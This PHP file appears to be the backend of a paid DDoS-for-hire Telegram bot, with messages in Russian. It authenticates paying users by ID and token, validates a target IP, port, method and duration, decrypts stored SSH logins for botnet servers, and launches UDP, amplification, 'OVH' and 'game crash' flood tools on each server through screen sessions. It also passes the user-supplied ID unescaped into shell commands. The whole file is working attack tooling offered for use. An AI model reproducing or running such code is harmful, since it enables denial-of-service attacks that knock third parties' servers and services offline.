<?php

    include __DIR__ . '/tg/config.php';

    header('Content-Type: application/json');

    $get_users = json_decode(file_get_contents(__DIR__ . "/tg/API/json/" . $get_config['users_file']), true);
    $get_botnet = json_decode(file_get_contents(__DIR__ . "/tg/API/json/" . $get_config['botnet_file']), true);
    $get_block_ip = json_decode(file_get_contents(__DIR__ . "/tg/API/json/" . $get_config['block_file']), true);

    $id = isset($_POST['id']) ? $_POST['id'] : '';
    $ip = isset($_POST['ip']) ? $_POST['ip'] : '';
    $port = isset($_POST['port']) ? $_POST['port'] : '';
    $method = isset($_POST['method']) ? $_POST['method'] : '';
    $time = isset($_POST['time']) ? $_POST['time'] : '';
    $ddos = isset($_POST['ddos']) ? $_POST['ddos'] : '';
    $token = isset($_POST['token']) ? $_POST['token'] : '';

    function onDecode($text, $key, $cipher) {

        $base64_decode = base64_decode($text);
        $ivlen = openssl_cipher_iv_length($cipher);
        $iv = substr($base64_decode, 0, $ivlen);
        $hmac = substr($base64_decode, $ivlen, $sha2len = 32);
        $raw = substr($base64_decode, $ivlen + $sha2len);
        $decode = openssl_decrypt($raw, $cipher, $key, $options = OPENSSL_RAW_DATA, $iv);
        $calcmac = hash_hmac('sha256', $raw, $key, $as_binary = true);

        if (hash_equals($hmac, $calcmac)) {

            return $decode;

        }

        return false;

    }

    if ($_SERVER['REQUEST_METHOD'] != 'POST') {

        print_R (

            json_encode (

                array (

                    "message" => "Не передан запрос POST",
                    "success" => false,

                ),

                JSON_UNESCAPED_UNICODE

            )

        );

        return false;

    }

    if ($id == null and $id == "") {

        print_R (

            json_encode (

                array (

                    "message" => "Нельзя использовать аргумент ID пустым или не заданным",
                    "success" => false

                ),

                JSON_UNESCAPED_UNICODE

            )

        );

        return false;

    } else if (!(array_key_exists($id, $get_users))) {

        print_R (

            json_encode (

                array (

                    "message" => "Для использования бота необходимо приобрести доступ к боту",
                    "url" => $get_config['url'],
                    "success" => false,

                ),

                JSON_UNESCAPED_UNICODE

            )

        );

        return false;

    }

    if ($ddos == null and $ddos == "") {

        print_R (

            json_encode (

                array (

                    "message" => "Нельзя использовать аргумент DDoS пустым или не заданным",
                    "success" => false,

                ),

                JSON_UNESCAPED_UNICODE

            )

        );

        return false;

    }

    if ($token == null and $token == "") {

        print_R (

            json_encode (

                array (

                    "message" => "Нельзя использовать аргумент Token пустым или не заданным",
                    "success" => false,

                ),

                JSON_UNESCAPED_UNICODE

            )

        );

        return false;

    } else if (array_key_exists($id, $get_users)) {

        $value = $get_users[$id];

        if ($value['token'] !== $token) {

            print_R (

                json_encode (

                    array (

                        "message" => "Не удалось получить ваш Token или он введен неверно",
                        "success" => false,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

            return false;

        }

    }

    if ($ddos == 'start') {

        if ($ip == null and $ip == "") {

            print_R (

                json_encode (

                    array (

                        "message" => "Нельзя использовать аргумент IP пустым или не заданным",
                        "success" => false,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

            return false;

        } else if (!(filter_var($ip, FILTER_VALIDATE_IP))) {

            print_R (

                json_encode (

                    array (

                        "message" => "Нельзя использовать буквы или спецсимволы в IP",
                        "success" => false,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

            return false;

        } else if (array_key_exists($ip, $get_block_ip)) {

            print_R (

                json_encode (

                    array (

                        "message" => "Нельзя ддосить данный IP адрес",
                        "success" => false,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

            return false;

        } else if ($port == null and $port == "") {

            print_R (

                json_encode (

                    array (

                        "message" => "Нельзя Port оставлять пустым",
                        "success" => false,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

            return false;

        } else if (!(is_numeric($port))) {

            print_R (

                json_encode (

                    array (

                        "message" => "Неверно введен Port используйте - (25565,19132,27015)",
                        "success" => false,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

            return false;

        } else if ($method == null and $method == "") {

            print_R (

                json_encode (

                    array (

                        "message" => "Нельзя метод оставлять пустым",
                        "success" => false,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

            return false;

        } else if (!(in_array($method, $get_config['methods']))) {

            print_R (

                json_encode (

                    array (

                        "message" => "Метод не найден",
                        "success" => false,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

            return false;

        } else if (!(is_numeric($time))) {

            print_R (

                json_encode (

                    array (

                        "message" => "Неверно введен аргумент Time используйте - (300,500,750)",
                        "success" => false,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

            return false;

        } else if ($time > $get_config['max_time']) {

            print_R (

                json_encode (

                    array (

                        "message" => "Нельзя использовать число большее " . $get_config['max_time'],
                        "success" => false,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

            return false;

        } else if ($time <= 0) {

            print_R (

                json_encode (

                    array (

                        "message" => "Нельзя использовать отрицательное число",
                        "success" => false,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

            return false;

        } else if ($time < 60) {

            print_R (

                json_encode (

                    array (

                        "message" => "Нельзя использовать меньшее число чем 60",
                        "success" => false,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

            return false;

        } else {

            foreach ($get_botnet as $key => $value) {

                $get_ip = onDecode($value['ip'], $get_config['key'], "AES-128-CBC");
                $get_port = onDecode($value['port'], $get_config['key'], "AES-128-CBC");
                $login = onDecode($value['login'], $get_config['key'], "AES-128-CBC");
                $password = onDecode($value['password'], $get_config['key'], "AES-128-CBC");

                $connection = ssh2_connect($get_ip, $get_port);
                $auth = ssh2_auth_password($connection, $login, $password);

                $screen_list = ssh2_exec($connection, "screen -ls | grep " . $id . " | cut -d. -f1 | awk '{print $1}'");

                stream_set_blocking($screen_list, true);

                $screen_pid = stream_get_contents($screen_list);

                if (!$screen_pid == null) {

                    print_R (

                        json_encode (

                            array (

                                "message" => "Атака уже запущена повторите попытку чуть позже",
                                "success" => false,

                            ),

                            JSON_UNESCAPED_UNICODE

                        )

                    );

                    return false;

                } else {

                    $ch = curl_init("http://ip-api.com/json/" . $ip);

                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_HEADER, false);

                    $get_json = curl_exec($ch);

                    curl_close($ch);

                    $get_org = json_decode($get_json, true)['org'];
                    $get_as = json_decode($get_json, true)['as'];

                    if (in_array($get_org, $get_config['company'])) {

                        print_R (

                            json_encode (

                                array (

                                    //"message" => "Данную компанию нельзя атаковать",
                                    "message" => "Данную компанию\n\n- IP :: " . $message[1] . ",\n- As :: " . $get_as . ",\n- Org :: " . $get_org . ".\n\nНельзя атаковать.",
                                    "ip" => $ip,
                                    "as" => $get_as,
                                    "org" => $get_org,
                                    "success" => false,

                                ),

                                JSON_UNESCAPED_UNICODE

                            )

                        );

                        return false;

                    }

                    if ($method == "UDP") {

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-UDP-BYPASS timeout --foreground -k 10 -s SIGKILL " . $time . " ./methods/udp-bypass " . $ip . " " . $port . " 750 750 " . $time);

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-UDP-BYPASS-V2 timeout --foreground -k 10 -s SIGKILL " . $time . " ./methods/udp-bypass-v2 " . $ip . " " . $port);

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-FL timeout --foreground -k 10 -s SIGKILL " . $time . " python3 /root/methods/fli.py " . $ip . " " . $port);

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-SUDP timeout --foreground -k 10 -s SIGKILL " . $time . " perl /root/methods/god.pl " . $ip . " " . $port . " 65500 " . $time);

                    } else if ($method == "STRESSER") {

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-STCP timeout --foreground -k 10 -s SIGKILL " . $time . " ./methods/stress " . $ip . " " . $port . " 1 750 " . $time . " 5");

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-SUDP timeout --foreground -k 10 -s SIGKILL " . $time . " ./methods/stress " . $ip . " " . $port . " 2 750 " . $time . " 5");

                    } else if ($method == "OVH") {

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-OVH-FL timeout --foreground -k 10 -s SIGKILL " . $time . " ./methods/OVH-FLIDR " . $ip . " " . $port . " 950 950 " . $time);

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-OVH-MT timeout --foreground -k 10 -s SIGKILL " . $time . " ./methods/MertOVH " . $ip . " " . $port);

                    } else if ($method == "HOME") {

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-HOME timeout --foreground -k 10 -s SIGKILL " . $time . " perl /root/methods/home.pl " . $ip . " " . $port . " 95500 " . $time);

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-FL timeout --foreground -k 10 -s SIGKILL " . $time . " python3 /root/methods/fli.py " . $ip . " " . $port);

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-GC timeout --foreground -k 10 -s SIGKILL " . $time . " ./methods/GAME-CRASH " . $ip . " " . $port);

                    } else if ($method == "AMP") {

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-OVH-AMP timeout --foreground -k 10 -s SIGKILL " . $time . " ./methods/OVH-AMP " . $ip . " " . $port);

                        $stream = ssh2_exec($connection, "screen -dmS attack-" . $id . "-AMP timeout --foreground -k 10 -s SIGKILL " . $time . " perl /root/methods/AMP.pl " . $ip . " " . $port . " 10000 " . $time);

                    }

                }

            }

            if ($stream) {

                print_R (

                    json_encode (

                        array (

                            "message" => "Атака успешно началась",
                            "host" => $ip,
                            "port" => $port,
                            "time" => $time,
                            "method" => $method,
                            "success" => true,

                        ),

                        JSON_UNESCAPED_UNICODE

                    )

                );

            } else if (!$auth) {

                print_R (

                    json_encode (

                        array (

                            "message" => "Не удалось авторизоваться возможные проблемы:\n\n - Не верный пароль,\n - Не верный логин,\n - Сервер не доступен.",
                            "success" => false,

                        ),

                        JSON_UNESCAPED_UNICODE

                    )

                );

                return false;

            } else if (!$connection) {

                print_R (

                    json_encode (

                        array (

                            "message" => "Не удалось установить соединение с сервером",
                            "success" => false,

                        ),

                        JSON_UNESCAPED_UNICODE

                    )

                );

                return false;

            }

            fclose($stream);

            ssh2_disconnect($connection);

        }

    } else if ($ddos == "stop") {

        foreach ($get_botnet as $key => $value) {

            $get_ip = onDecode($value['ip'], $get_config['key'], "AES-128-CBC");
            $get_port = onDecode($value['port'], $get_config['key'], "AES-128-CBC");
            $login = onDecode($value['login'], $get_config['key'], "AES-128-CBC");
            $password = onDecode($value['password'], $get_config['key'], "AES-128-CBC");

            $connection = ssh2_connect($get_ip, $get_port);
            $auth = ssh2_auth_password($connection, $login, $password);

            $screen_list = ssh2_exec($connection, "screen -ls | grep " . $id . " | cut -d. -f1 | awk '{print $1}'");

            stream_set_blocking($screen_list, true);

            $screen_pid = stream_get_contents($screen_list);

            if (empty($screen_pid)) {
                
                print_R (

                    json_encode (

                        array (

                            "message" => "Не найдена запущеной атаки",
                            "success" => false,

                        ),

                        JSON_UNESCAPED_UNICODE

                    )

                );

                return false;

            }

            $stream = ssh2_exec($connection, "screen -ls | grep " . $id . " | cut -d. -f1 | awk '{print $1}' | xargs kill");

        }        

        if ($stream) {

            print_R (

                json_encode (

                    array (

                        "message" => "DDoS атака успешно остановлена",
                        "success" => true,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

            fclose($stream);

            return true;

        }

        if (!$auth) {

            print_R (

                json_encode (

                    array (

                        "message" => "Не удалось авторизоваться возможные проблемы:\n\n - Не верный пароль,\n - Не верный логин,\n - Сервер не доступен",
                        "success" => false,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

            return false;

        } else if (!$connection) {

            print_R (

                json_encode (

                    array (

                        "message" => "Не удалось установить соединение с сервером",
                        "success" => false,

                    ),

                    JSON_UNESCAPED_UNICODE

                )

            );

        }

        ssh2_disconnect($connection);

        return true;

    } else {

        print_R (

            json_encode (

                array (

                    "message" => "Недопустимый метод - (start/stop)",
                    "success" => false,

                ),

                JSON_UNESCAPED_UNICODE

            )

        );

        return false;

    }

?>